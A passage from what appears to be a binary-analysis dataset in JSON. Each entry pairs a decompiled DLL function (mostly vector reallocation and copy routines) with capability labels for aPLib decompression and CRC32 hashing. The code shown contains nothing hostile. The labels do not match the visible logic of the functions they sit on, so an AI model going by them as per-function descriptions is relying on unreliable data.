fcn.18008fb2c(uVar6);\n        if (iVar3 == 0) goto code_r0x00018002f47a;\n        uVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar3;\n    }\n    arg1[2] = arg2 + uVar8;\n    arg1[3] = uVar7;\n    if (uVar1 < 0x10) {\n        fcn.1800ade80(uVar5, arg1, uVar8);\n        fcn.1800ae290(uVar5 + uVar8, in_stack_00000028, arg4);\n        *(arg4 + uVar5 + uVar8) = 0;\n    }\n    else {\n        uVar7 = *arg1;\n        fcn.1800ade80(uVar5, uVar7, uVar8);\n        fcn.1800ae290(uVar5 + uVar8, in_stack_00000028, arg4);\n        *(arg4 + uVar5 + uVar8) = 0;\n        uVar8 = uVar7;\n        if ((0xfff < uVar1 + 1) && (uVar8 = *(uVar7 - 8),  0x1f < (uVar7 - uVar8) - 8)) {\ncode_r0x00018002f47a:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        fcn.18008fb24(uVar8);\n    }\n    *arg1 = uVar5;\n    return arg1;\n}\n",
        "token_count": 825
    },
    "18002fb1": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.18002fb10(uint64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    \n    if (0x111111111111111 < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar3 = (arg1[1] - *arg1) + SUB168(SEXT816(-0x7777777777777777) * SEXT816(arg1[1] - *arg1) >> 0x40, 0);\n    iVar5 = (iVar3 >> 7) - (iVar3 >> 0x3f);\n    iVar3 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(arg1[2] - *arg1) >> 0x40, 0) + (arg1[2] - *arg1);\n    uVar4 = (iVar3 >> 7) - (iVar3 >> 0x3f);\n    uVar8 = arg2;\n    if ((uVar4 <= 0x111111111111111 - (uVar4 >> 1)) && (uVar8 = (uVar4 >> 1) + uVar4,  uVar8 < arg2)) {\n        uVar8 = arg2;\n    }\n    uVar4 = uVar8 * 0xf0;\n    if (uVar8 < 0x111111111111112) {\n        if (uVar4 < 0x1000) {\n            if (uVar4 == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = fcn.18008fb2c(uVar4);\n            }\n            goto code_r0x00018002fc1a;\n        }\n    }\n    else {\n        uVar4 = 0xffffffffffffffff;\n    }\n    uVar2 = uVar4 + 0x27;\n    if (uVar2 <= uVar4) {\n        uVar2 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(uVar2);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar4 = iVar3 + 0x27U & 0xffffffffffffffe0;\n    *(uVar4 - 8) = iVar3;\ncode_r0x00018002fc1a:\n    fcn.18002f6d0(arg1, iVar5 * 0xf0 + uVar4, arg2 - iVar5);\n    uVar2 = arg1[1];\n    uVar7 = uVar4;\n    for (uVar6 = *arg1; uVar6 != uVar2; uVar6 = uVar6 + 0xf0) {\n        fcn.180025590(uVar7, uVar6);\n        uVar7 = uVar7 + 0xf0;\n    }\n    uVar2 = *arg1;\n    if (uVar2 != 0) {\n        uVar6 = arg1[1];\n        if (uVar2 != uVar6) {\n            do {\n                fcn.180025000(uVar2);\n                uVar2 = uVar2 + 0xf0;\n            } while (uVar2 != uVar6);\n            uVar2 = *arg1;\n        }\n        iVar3 = arg1[2] - uVar2;\n        iVar5 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar3) >> 0x40, 0) + iVar3;\n        uVar7 = ((iVar5 >> 7) - (iVar5 >> 0x3f)) * 0xf0;\n        uVar6 = uVar2;\n        if (0xfff < uVar7) {\n            uVar6 = *(uVar2 - 8);\n            if (0x1f < (uVar2 - uVar6) - 8) {\n                fcn.1800b3528(iVar3, uVar7 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(uVar6);\n    }\n    *arg1 = uVar4;\n    arg1[1] = arg2 * 0xf0 + uVar4;\n    arg1[2] = uVar8 * 0xf0 + uVar4;\n    return;\n}\n",
        "token_count": 1068
    },
    "18002fcc": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.18002fcc0(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t arg2_00;\n    int64_t iVar5;\n    \n    if (0x199999999999999 < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar4 = (arg1[1] - *arg1) / 0xa0;\n    iVar2 = arg1[2] - *arg1;\n    uVar3 = iVar2 / 0xa0;\n    arg2_00 = arg2;\n    if ((uVar3 <= 0x199999999999999 - (uVar3 >> 1)) && (arg2_00 = (uVar3 >> 1) + uVar3,  arg2_00 < arg2)) {\n        arg2_00 = arg2;\n    }\n    arg1_00 = fcn.18002e1e0(iVar2, arg2_00);\n    fcn.18002f850(iVar2, iVar4 * 0xa0 + arg1_00, arg2 - iVar4);\n    iVar4 = *arg1;\n    iVar2 = arg1[1];\n    iVar5 = arg1_00;\n    if (iVar4 != iVar2) {\n        do {\n            fcn.1800254a0(arg1_00, iVar4);\n            arg1_00 = arg1_00 + 0xa0;\n            iVar4 = iVar4 + 0xa0;\n        } while (iVar4 != iVar2);\n    }\n    iVar4 = *arg1;\n    if (iVar4 != 0) {\n        iVar2 = arg1[1];\n        if (iVar4 != iVar2) {\n            do {\n                fcn.1800252e0(iVar4);\n                iVar4 = iVar4 + 0xa0;\n            } while (iVar4 != iVar2);\n            iVar4 = *arg1;\n        }\n        uVar3 = ((arg1[2] - iVar4) / 0xa0) * 0xa0;\n        iVar2 = iVar4;\n        if (0xfff < uVar3) {\n            iVar2 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - iVar2) - 8U) {\n                fcn.1800b3528(arg1[2] - iVar4, uVar3 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar2);\n    }\n    *arg1 = iVar5;\n    arg1[1] = arg2 * 0xa0 + iVar5;\n    arg1[2] = arg2_00 * 0xa0 + iVar5;\n    return;\n}\n",
        "token_count": 671
    },
    "18002fdc": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.18002fdc0(uint64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t arg1_00;\n    uint64_t uVar4;\n    int64_t arg2_00;\n    uint64_t arg1_01;\n    uint64_t uVar5;\n    uint64_t arg2_01;\n    uint64_t uVar6;\n    \n    uVar4 = arg1[1];\n    arg1_01 = *arg1;\n    uVar3 = (arg3 - arg2) / 0xa0;\n    uVar6 = (uVar4 - arg1_01) / 0xa0;\n    if (uVar6 < uVar3) {\n        uVar5 = arg1[2];\n        uVar2 = (uVar5 - arg1_01) / 0xa0;\n        if (uVar2 < uVar3) {\n            if (0x199999999999999 < uVar3) {\n                fcn.180014900();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            arg1_00 = uVar2 >> 1;\n            arg2_01 = uVar3;\n            if ((uVar2 <= 0x199999999999999 - arg1_00) && (arg2_01 = arg1_00 + uVar2,  arg1_00 + uVar2 < uVar3)) {\n                arg2_01 = uVar3;\n            }\n            uVar6 = 0;\n            if (arg1_01 != 0) {\n                if (arg1_01 != uVar4) {\n                    do {\n                        fcn.1800252e0(arg1_01);\n                        arg1_01 = arg1_01 + 0xa0;\n                    } while (arg1_01 != uVar4);\n                    uVar5 = arg1[2];\n                    arg1_01 = *arg1;\n                }\n                uVar4 = ((uVar5 - arg1_01) / 0xa0) * 0xa0;\n                arg1_00 = arg1_01;\n                if (0xfff < uVar4) {\n                    arg1_00 = *(arg1_01 - 8);\n                    if (0x1f < (arg1_01 - arg1_00) - 8) {\n                        fcn.1800b3528(arg1_00, uVar4 + 0x27);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n                *arg1 = 0;\n                arg1[1] = 0;\n                arg1[2] = 0;\n            }\n            uVar4 = fcn.18002e1e0(arg1_00, arg2_01);\n            *arg1 = uVar4;\n            arg1[1] = uVar4;\n            arg1[2] = arg2_01 * 0xa0 + uVar4;\n        }\n        uVar4 = *arg1;\n        arg2_00 = uVar6 * 0xa0 + arg2;\n        if (arg2 != arg2_00) {\n            do {\n                fcn.180028ac0(uVar4, arg2);\n                uVar4 = uVar4 + 0xa0;\n                arg2 = arg2 + 0xa0;\n            } while (arg2 != arg2_00);\n        }\n        uVar4 = fcn.18002efd0(arg1, arg2_00, arg3, arg1[1]);\n        arg1[1] = uVar4;\n    }\n    else {\n        uVar6 = uVar3 * 0xa0 + arg1_01;\n        uVar3 = uVar6;\n        if (arg2 != arg3) {\n            do {\n                fcn.180028ac0(arg1_01, arg2);\n                arg1_01 = arg1_01 + 0xa0;\n                arg2 = arg2 + 0xa0;\n            } while (arg2 != arg3);\n            uVar4 = arg1[1];\n        }\n        for (; uVar3 != uVar4; uVar3 = uVar3 + 0xa0) {\n            fcn.1800252e0(uVar3);\n        }\n        arg1[1] = uVar6;\n    }\n    return;\n}\n",
        "token_count": 1009
    },
    "18003c24": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t fcn.18003c240(int64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint64_t arg3_00;\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t arg4;\n    \n    iVar3 = *arg1;\n    iVar5 = (arg2 - iVar3) / 0x12 + (arg2 - iVar3 >> 0x3f);\n    iVar6 = (arg1[1] - iVar3) / 0x48;\n    if (iVar6 == 0x38e38e38e38e38e) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    arg3_00 = iVar6 + 1;\n    uVar2 = (arg1[2] - iVar3) / 0x48;\n    arg4 = arg3_00;\n    if ((uVar2 <= 0x38e38e38e38e38e - (uVar2 >> 1)) && (arg4 = (uVar2 >> 1) + uVar2,  arg4 < arg3_00)) {\n        arg4 = arg3_00;\n    }\n    uVar2 = arg4 * 0x48;\n    if (arg4 < 0x38e38e38e38e38f) {\n        if (uVar2 < 0x1000) {\n            if (uVar2 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.18008fb2c(uVar2);\n            }\n            goto code_r0x00018003c363;\n        }\n    }\n    else {\n        uVar2 = 0xffffffffffffffff;\n    }\n    uVar4 = uVar2 + 0x27;\n    if (uVar4 <= uVar2) {\n        uVar4 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(uVar4);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    uVar2 = iVar3 + 0x27U & 0xffffffffffffffe0;\n    *(uVar2 - 8) = iVar3;\ncode_r0x00018003c363:\n    iVar3 = uVar2 + ((iVar5 >> 2) - (iVar5 >> 0x3f)) * 0x48;\n    fcn.18000da90(iVar3, arg3);\n    *(iVar3 + 0x20) = *(arg3 + 0x20);\n    *(iVar3 + 0x24) = *(arg3 + 0x24);\n    fcn.18000da90(iVar3 + 0x28, arg3 + 0x28);\n    iVar6 = arg1[1];\n    iVar5 = *arg1;\n    uVar4 = uVar2;\n    if (arg2 != iVar6) {\n        fcn.18003ca50(*arg1, arg2, uVar2);\n        iVar6 = arg1[1];\n        iVar5 = arg2;\n        uVar4 = iVar3 + 0x48;\n    }\n    fcn.18003ca50(iVar5, iVar6, uVar4);\n    fcn.18003c7d0(arg1, uVar2, arg3_00, arg4);\n    return iVar3;\n}\n",
        "token_count": 829
    },
    "18003c8b": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.18003c8b0(uint64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uchar (*pauVar4) [16];\n    uint64_t uVar5;\n    int64_t iVar6;\n    uchar (*pauVar7) [16];\n    uint64_t uVar8;\n    uint64_t arg3;\n    uint64_t uVar9;\n    ulong var_1h;\n    \n    if (0x38e38e38e38e38e < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar6 = (arg1[1] - *arg1) / 0x12 + (arg1[1] - *arg1 >> 0x3f);\n    iVar6 = (iVar6 >> 2) - (iVar6 >> 0x3f);\n    uVar8 = (arg1[2] - *arg1) / 0x48;\n    uVar9 = arg2;\n    if ((uVar8 <= 0x38e38e38e38e38e - (uVar8 >> 1)) && (uVar9 = (uVar8 >> 1) + uVar8,  uVar9 < arg2)) {\n        uVar9 = arg2;\n    }\n    arg3 = 0;\n    uVar2 = uVar9 * 0x48;\n    uVar8 = 0xffffffffffffffff;\n    if ((uVar9 < 0x38e38e38e38e38f) && (uVar8 = uVar2,  uVar2 < 0x1000)) {\n        if (uVar2 != 0) {\n            arg3 = fcn.18008fb2c(uVar2);\n        }\n    }\n    else {\n        uVar2 = uVar8 + 0x27;\n        if (uVar8 + 0x27 <= uVar8) {\n            uVar2 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar2);\n        if (iVar3 == 0) {\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        arg3 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(arg3 - 8) = iVar3;\n    }\n    pauVar7 = arg3 + iVar6 * 0x48;\n    iVar6 = arg2 - iVar6;\n    if (iVar6 != 0) {\n        pauVar4 = pauVar7[4];\n        do {\n            *pauVar7 = ZEXT816(0);\n            pauVar7[1] = ZEXT816(0);\n            pauVar7[2] = ZEXT816(0);\n            pauVar7[3] = ZEXT816(0);\n            *pauVar7[4] = 0;\n            *pauVar4[-3] = 0;\n            *(pauVar4[-3] + 8) = 7;\n            **pauVar7 = 0;\n            pauVar7 = pauVar7[4] + 8;\n            *pauVar4[-2] = 0;\n            *(pauVar4[-1] + 8) = 0;\n            **pauVar4 = 7;\n            *(pauVar4[-2] + 8) = 0;\n            iVar6 = iVar6 + -1;\n            pauVar4 = pauVar4[4] + 8;\n        } while (iVar6 != 0);\n    }\n    fcn.18003ca50(*arg1, arg1[1], arg3);\n    uVar8 = *arg1;\n    if (uVar8 != 0) {\n        uVar2 = arg1[1];\n        if (uVar8 != uVar2) {\n            do {\n                fcn.180037040(uVar8);\n                uVar8 = uVar8 + 0x48;\n            } while (uVar8 != uVar2);\n            uVar8 = *arg1;\n        }\n        uVar5 = ((arg1[2] - uVar8) / 0x48) * 0x48;\n        uVar2 = uVar8;\n        if (0xfff < uVar5) {\n            uVar2 = *(uVar8 - 8);\n            if (0x1f < (uVar8 - uVar2) - 8) {\n                fcn.1800b3528(arg1[2] - uVar8, uVar5 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(uVar2);\n    }\n    *arg1 = arg3;\n    arg1[1] = arg3 + arg2 * 0x48;\n    arg1[2] = arg3 + uVar9 * 0x48;\n    return;\n}\n",
        "token_count": 1140
    },
    "18004945": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * fcn.180049450(int64_t *arg1, int64_t arg2, uint *arg3)\n\n{\n    uint64_t arg3_00;\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint *puVar8;\n    uint64_t noname_0;\n    int64_t iVar9;\n    uint64_t arg2_00;\n    uint *arg2_01;\n    \n    iVar9 = *arg1;\n    iVar6 = arg1[1] - iVar9 >> 6;\n    if (iVar6 == 0x3ffffffffffffff) {\n        fcn.180014900();\n        pcVar2 = swi(3);\n        puVar8 = (*pcVar2)();\n        return puVar8;\n    }\n    arg3_00 = iVar6 + 1;\n    uVar7 = arg1[2] - iVar9 >> 6;\n    noname_0 = uVar7 >> 1;\n    arg2_00 = arg3_00;\n    if ((uVar7 <= 0x3ffffffffffffff - noname_0) && (arg2_00 = noname_0 + uVar7,  noname_0 + uVar7 < arg3_00)) {\n        arg2_00 = arg3_00;\n    }\n    puVar8 = fcn.180049020(noname_0, arg2_00);\n    puVar1 = (arg2 - iVar9 & 0xffffffffffffffc0U) + puVar8;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 6) = 0;\n    uVar3 = arg3[1];\n    uVar4 = arg3[2];\n    uVar5 = arg3[3];\n    *puVar1 = *arg3;\n    puVar1[1] = uVar3;\n    puVar1[2] = uVar4;\n    puVar1[3] = uVar5;\n    uVar3 = arg3[5];\n    uVar4 = arg3[6];\n    uVar5 = arg3[7];\n    puVar1[4] = arg3[4];\n    puVar1[5] = uVar3;\n    puVar1[6] = uVar4;\n    puVar1[7] = uVar5;\n    *(arg3 + 4) = 0;\n    *(arg3 + 6) = 0xf;\n    *arg3 = 0;\n    *(puVar1 + 0xc) = 0;\n    *(puVar1 + 0xe) = 0;\n    uVar3 = arg3[9];\n    uVar4 = arg3[10];\n    uVar5 = arg3[0xb];\n    puVar1[8] = arg3[8];\n    puVar1[9] = uVar3;\n    puVar1[10] = uVar4;\n    puVar1[0xb] = uVar5;\n    uVar3 = arg3[0xd];\n    uVar4 = arg3[0xe];\n    uVar5 = arg3[0xf];\n    puVar1[0xc] = arg3[0xc];\n    puVar1[0xd] = uVar3;\n    puVar1[0xe] = uVar4;\n    puVar1[0xf] = uVar5;\n    *(arg3 + 0xc) = 0;\n    *(arg3 + 0xe) = 7;\n    *(arg3 + 8) = 0;\n    iVar9 = arg1[1];\n    iVar6 = *arg1;\n    arg2_01 = puVar8;\n    if (arg2 != iVar9) {\n        fcn.18004a2d0(*arg1, arg2, puVar8);\n        iVar9 = arg1[1];\n        puVar8 = puVar1 + 0x10;\n        iVar6 = arg2;\n    }\n    fcn.18004a2d0(iVar6, iVar9, puVar8);\n    fcn.1800498b0(arg1, arg2_01, arg3_00, arg2_00);\n    return puVar1;\n}\n",
        "token_count": 955
    },
    "18004997": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180049970(uint64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t arg3;\n    uint64_t uVar7;\n    \n    if (0x2aaaaaaaaaaaaaa < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar6 = (arg1[1] - *arg1) / 6 + (arg1[1] - *arg1 >> 0x3f);\n    iVar6 = (iVar6 >> 4) - (iVar6 >> 0x3f);\n    uVar2 = (arg1[2] - *arg1) / 0x60;\n    uVar4 = uVar2 >> 1;\n    uVar7 = arg2;\n    if ((uVar2 <= 0x2aaaaaaaaaaaaaa - uVar4) && (uVar7 = uVar4 + uVar2,  uVar4 + uVar2 < arg2)) {\n        uVar7 = arg2;\n    }\n    uVar2 = uVar7 * 0x60;\n    if (uVar7 < 0x2aaaaaaaaaaaaab) {\n        if (uVar2 < 0x1000) {\n            if (uVar2 == 0) {\n                arg3 = 0;\n            }\n            else {\n                arg3 = fcn.18008fb2c(uVar2);\n                uVar4 = uVar2;\n            }\n            goto code_r0x000180049a5f;\n        }\n    }\n    else {\n        uVar2 = 0xffffffffffffffff;\n    }\n    uVar4 = uVar2 + 0x27;\n    if (uVar4 <= uVar2) {\n        uVar4 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(uVar4);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    arg3 = iVar3 + 0x27U & 0xffffffffffffffe0;\n    *(arg3 - 8) = iVar3;\ncode_r0x000180049a5f:\n    fcn.180049740(uVar4, iVar6 * 0x60 + arg3, arg2 - iVar6);\n    fcn.18004a0e0(*arg1, arg1[1], arg3);\n    uVar4 = *arg1;\n    if (uVar4 != 0) {\n        uVar2 = arg1[1];\n        uVar5 = arg3;\n        if (uVar4 != uVar2) {\n            do {\n                fcn.180048db0(uVar4 + 0x48, uVar5);\n                fcn.180042e30(uVar4);\n                uVar4 = uVar4 + 0x60;\n            } while (uVar4 != uVar2);\n            uVar4 = *arg1;\n        }\n        uVar5 = ((arg1[2] - uVar4) / 0x60) * 0x60;\n        uVar2 = uVar4;\n        if (0xfff < uVar5) {\n            uVar2 = *(uVar4 - 8);\n            if (0x1f < (uVar4 - uVar2) - 8) {\n                fcn.1800b3528(arg1[2] - uVar4, uVar5 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(uVar2);\n    }\n    *arg1 = arg3;\n    arg1[1] = arg2 * 0x60 + arg3;\n    arg1[2] = uVar7 * 0x60 + arg3;\n    return;\n}\n",
        "token_count": 916
    },
    "180049ac": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180049ac0(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t arg3;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint64_t arg2_00;\n    ulong *puVar6;\n    \n    if (0x2aaaaaaaaaaaaaa < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar3 = (arg1[1] - *arg1) / 6 + (arg1[1] - *arg1 >> 0x3f);\n    iVar3 = (iVar3 >> 4) - (iVar3 >> 0x3f);\n    uVar2 = (arg1[2] - *arg1) / 0x60;\n    arg2_00 = arg2;\n    if ((uVar2 <= 0x2aaaaaaaaaaaaaa - (uVar2 >> 1)) && (arg2_00 = (uVar2 >> 1) + uVar2,  arg2_00 < arg2)) {\n        arg2_00 = arg2;\n    }\n    arg3 = fcn.180048fa0(arg1[2] - *arg1, arg2_00);\n    puVar4 = iVar3 * 0x60 + arg3;\n    iVar3 = arg2 - iVar3;\n    if (iVar3 != 0) {\n        puVar6 = puVar4 + 0x38;\n        do {\n            *(puVar4 + 1) = ZEXT816(0);\n            *(puVar4 + 0x11) = ZEXT816(0);\n            *(puVar4 + 0x21) = ZEXT816(0);\n            *(puVar4 + 0x31) = ZEXT816(0);\n            *(puVar4 + 0x41) = ZEXT816(0);\n            *(puVar4 + 0x51) = 0;\n            *(puVar4 + 0x59) = 0;\n            *(puVar4 + 0x5d) = 0;\n            puVar4[0x5f] = 0;\n            puVar6[-5] = 0;\n            puVar6[-4] = 0xf;\n            *puVar4 = 0;\n            puVar6[-1] = 0;\n            *puVar6 = 7;\n            *(puVar6 + -3) = 0;\n            *(puVar6 + 1) = 0;\n            *(puVar6 + 0xc) = 0;\n            puVar6[2] = 0;\n            puVar6[3] = 0;\n            puVar6[4] = 0;\n            iVar3 = iVar3 + -1;\n            puVar4 = puVar4 + 0x60;\n            puVar6 = puVar6 + 0xc;\n        } while (iVar3 != 0);\n    }\n    fcn.18004a1d0(*arg1, arg1[1], arg3);\n    iVar3 = *arg1;\n    if (iVar3 != 0) {\n        iVar5 = arg1[1];\n        if (iVar3 != iVar5) {\n            do {\n                fcn.180048ec0(iVar3 + 0x48);\n                fcn.180042e30(iVar3);\n                iVar3 = iVar3 + 0x60;\n            } while (iVar3 != iVar5);\n            iVar3 = *arg1;\n        }\n        uVar2 = ((arg1[2] - iVar3) / 0x60) * 0x60;\n        iVar5 = iVar3;\n        if (0xfff < uVar2) {\n            iVar5 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - iVar5) - 8U) {\n                fcn.1800b3528(arg1[2] - iVar3, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar5);\n    }\n    *arg1 = arg3;\n    arg1[1] = arg2 * 0x60 + arg3;\n    arg1[2] = arg2_00 * 0x60 + arg3;\n    return;\n}\n",
        "token_count": 994
    },
    "180049c3": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180049c30(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t arg3;\n    uint64_t uVar2;\n    uchar (*pauVar3) [16];\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t arg2_00;\n    ulong *puVar6;\n    \n    if (0x3ffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar2 = arg1[2] - *arg1 >> 6;\n    iVar5 = arg1[1] - *arg1 >> 6;\n    arg2_00 = arg2;\n    if ((uVar2 <= 0x3ffffffffffffff - (uVar2 >> 1)) && (arg2_00 = (uVar2 >> 1) + uVar2,  arg2_00 < arg2)) {\n        arg2_00 = arg2;\n    }\n    arg3 = fcn.180049020(uVar2, arg2_00);\n    pauVar3 = iVar5 * 0x40 + arg3;\n    iVar5 = arg2 - iVar5;\n    if (iVar5 != 0) {\n        puVar6 = pauVar3[3] + 8;\n        do {\n            *pauVar3 = ZEXT816(0);\n            pauVar3[1] = ZEXT816(0);\n            pauVar3[2] = ZEXT816(0);\n            pauVar3[3] = ZEXT816(0);\n            puVar6[-5] = 0;\n            puVar6[-4] = 0xf;\n            (*pauVar3)[0] = 0;\n            puVar6[-1] = 0;\n            *puVar6 = 7;\n            *(puVar6 + -3) = 0;\n            iVar5 = iVar5 + -1;\n            pauVar3 = pauVar3[4];\n            puVar6 = puVar6 + 8;\n        } while (iVar5 != 0);\n    }\n    fcn.18004a2d0(*arg1, arg1[1], arg3);\n    iVar5 = *arg1;\n    if (iVar5 != 0) {\n        iVar4 = arg1[1];\n        if (iVar5 != iVar4) {\n            do {\n                fcn.180042e30(iVar5);\n                iVar5 = iVar5 + 0x40;\n            } while (iVar5 != iVar4);\n            iVar5 = *arg1;\n        }\n        uVar2 = arg1[2] - iVar5 & 0xffffffffffffffc0;\n        iVar4 = iVar5;\n        if (0xfff < uVar2) {\n            iVar4 = *(iVar5 + -8);\n            if (0x1f < (iVar5 - iVar4) - 8U) {\n                fcn.1800b3528(iVar4, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    *arg1 = arg3;\n    arg1[1] = arg2 * 0x40 + arg3;\n    arg1[2] = arg2_00 * 0x40 + arg3;\n    return;\n}\n",
        "token_count": 764
    },
    "180049d4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180049d40(uint64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t arg1_00;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t arg2_00;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    \n    iVar4 = (arg3 - arg2) / 6 + (arg3 - arg2 >> 0x3f);\n    uVar3 = arg1[1];\n    uVar5 = *arg1;\n    uVar6 = (iVar4 >> 4) - (iVar4 >> 0x3f);\n    iVar4 = (uVar3 - uVar5) / 6 + (uVar3 - uVar5 >> 0x3f);\n    uVar8 = (iVar4 >> 4) - (iVar4 >> 0x3f);\n    if (uVar8 < uVar6) {\n        uVar7 = arg1[2];\n        uVar2 = (uVar7 - uVar5) / 0x60;\n        if (uVar2 < uVar6) {\n            if (0x2aaaaaaaaaaaaaa < uVar6) {\n                fcn.180014900();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            arg1_00 = uVar2 >> 1;\n            arg2_00 = uVar6;\n            if ((uVar2 <= 0x2aaaaaaaaaaaaaa - arg1_00) && (arg2_00 = arg1_00 + uVar2,  arg1_00 + uVar2 < uVar6)) {\n                arg2_00 = uVar6;\n            }\n            uVar8 = 0;\n            if (uVar5 != 0) {\n                if (uVar5 != uVar3) {\n                    do {\n                        fcn.180048ec0(uVar5 + 0x48);\n                        